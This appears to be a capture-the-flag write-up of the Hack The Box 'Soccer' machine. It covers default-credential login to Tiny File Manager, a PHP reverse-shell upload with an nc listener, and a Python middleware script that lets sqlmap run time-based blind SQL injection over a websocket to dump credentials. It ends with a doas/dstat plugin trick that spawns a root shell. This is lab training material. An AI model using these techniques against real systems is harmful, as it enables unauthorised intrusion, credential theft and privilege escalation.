---
title: Soccer
tags: HTB linux Tiny_file_manager SQLi 
article_header:
  type: cover
published: true
author: krill
---
Blind-Time-based SQL injection over websocket . . . 
![](/images/HTB/soccer/Soccer.png)

<!--more-->

## Reconnaissance
```
nmap -sCV -oN map.txt -p- --min-rate 2000 10.10.11.194

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 12 Jun 2023 14:08:36 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 12 Jun 2023 14:08:37 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|     </html>
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 12 Jun 2023 14:08:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```


## Service Enumeration 
```
[+] Port 22
	Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	Public-Exploit: None 

	- I need credentials to gain access to this, which I don't currently have 
	
[+] Port 9091
	Version: xmltec-xmlmail?
	Public-Exploit: None 

	- Service enumeration not valid :(

[+] Port 80
	Version:  nginx 1.18.0 (Ubuntu)
	Public-Exploit: 
	
	- Visiting the webpage on port 80, you need to add `soccer.htb` to your host file.
		> echo "10.10.11.194  soccer.htb" | sudo  tee -a  /etc/hosts

	- The IP address should resolve to `soccer.htb` now 
```

![](/images/HTB/soccer/resolve.png)
```
	[+] Directory Bruteforce
		- USing ffuf
```
![](/images/HTB/soccer/fuzz.png)
```
	- Visiting the /tiny sub-directory. We are presented with a login-page. 
```
![](/images/HTB/soccer/2023-06-12_19-23.png)
```	
	- Following the link provided, which links to the github repository of the project. 
```
![tiny](/images/HTB/soccer/tiny.png)
```
		- Going through the documentation, I was able to obtain default credentials. 
			- admin/admin@123
			- user/12345

	- Authenticated successfully with admin/admin@123

``` 


## Initial Access
```
[+] Authenticated File Upload
	- Navigating to the /upload directory, I have permissions to upload whatever file I want to this directory.
	
	- Since the file manager was built with php, we can upload a php-reverse-shell-payload.
	- A popular selection is the php-reverse-shell by pentest-monkey :)
	
	- Modify the payload to include your Attack-IP and Listener-port, then upload this file. 
```
![upload](/images/HTB/soccer/upload.png)
```
	- Start a netcat listener or whatever you use, to accept the reverse connection which should result in a shell.
		> nc -lvnp 443 
	
	- All that is left is finding a way to trigger the uploaded payload
		
		- You can easily trigger the payload by visiting `soccer.htb/tiny/uploads/<file.php>` 
		- replace <file.php> with whatever you uploaded or it's all gonna be L :( 

	- If all went well, you should get a shell as user `www-data` 
	- www-data is the user that web servers on Ubuntu use by default for normal operation. 


[+] shell :) 
```


## Post Exploitation
```
[+] Automated Enumeration

	- Using linpeas, I discovered a new sub-directory called `soc-player.soccer.htb`. 
	- It was under the `/etc/nginx/sites-available` directory, which is an important location to check while enumerating. 
		> ls /etc/nginx/sites-available/ 
```
![](/images/HTB/soccer/soc.png)
```
	- Add the new sub-directory to your host file 
		> echo "10.10.11.194  soc-player.soccer.htb" | sudo  tee -a  /etc/hosts

	- Visiting `http://soc-player.soccer.htb`, the web page looks exactly like `soccer.htb` just with a couple added features; 
```
![](/images/HTB/soccer/fet.png)
```
	- Create an account and sign-in
	- Now we have two endpoints `Match` and `Tickets`
	- `Match` shows you the scheduled matches while `Tickets` allows you to validate your ticket. Interesting :) 
```
![](/images/HTB/soccer/both.png)
```
[+] Blind-SQL-Injection over Web-Sockets

	- Taking a look at the `tickets` endpoint, we have an input field which can be tested for SQL-injection. 
	- Trying to test manually for SQLi, the page didn't seem to be sending any request.
		- Not true, it was sending data, but over a different protocol. Web-Socket _-_	
```
![](/images/HTB/soccer/socks.png)
```
	- Using Web Developer Tools, we can see that our data is being sent over Web-socket. 
```
![](/images/HTB/soccer/websock.png)
```
	- Now to test for SQLi, I did a quick google search on `websocket sql injection` and the first result was all I needed :)
```
![](/images/HTB/soccer/gog.png)
```
	- It's not possible to perform SQLi directly using SQLMap like sqlmap -u "ws://link/"
	  
	- This blog provided a python3 HTTP Server script that will recieve the SQLMap payload and send it to the target. 
	  
	- You can Identify the websocket using Web Developer Tools. 
```
![](/images/HTB/soccer/sock1.png)
```
	 - Modify the script to include the websocket endpoit of our target and the data which in this case is "id"
```
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091/"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"id":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```
```
	 - Run the Server script and start SQLMap 
		 >  sqlmap -u "http://localhost:8081/?id=1" --dump-all   --exclude-sysdbs 
```
![](/images/HTB/soccer/sql.gif)
```
	- This took a longgg time - It's a Time-based Blind-SQL injection attack.
		- You should get pop-corn or something :) 

//: One Eterninty Later //: 

+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

	- I successfully dumped the credential for the user 'player'
	
	- Used the credential to sign-in with ssh
		> ssh player@soccer.htb 


[+] Privilege Escalation 
	- Running automated-enumeration with linpeas again, I discoverd an entry in the doas.conf file. 
```
![](/images/HTB/soccer/doas.png)
```
	- This grants the user "player" the ability to execute the command `/usr/bin/dstat` with root privileges without the need for a password prompt
	
	- The doas binary is similar to sudo, it is a program that allows users to run commands with the privileges of another user.
	- The `doas.conf` file contains rules that define which users can execute specific commands with elevated privileges.


	[+] Abusing doas privilege 
		- checking GTFO-bins for ways to abuse the privileges set on /usr/bin/dstat  
```
![](/images/HTB/soccer/dstat.png)
```
	- Interesting. We should be able to leverage this to get a shell as the root user. 
```
![](/images/HTB/soccer/sudo.png)
```
	- You can use the same command as above, just change the sudo to doas, and provide the absolute path of the dstat binary. 
		> echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
		> doas /usr/bin/dstat --xxx 
		
	[+] Root :) 
```



- [Default_credentials](https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management)
- [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [Blind_SQLi_over_websocket_script_blog](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)
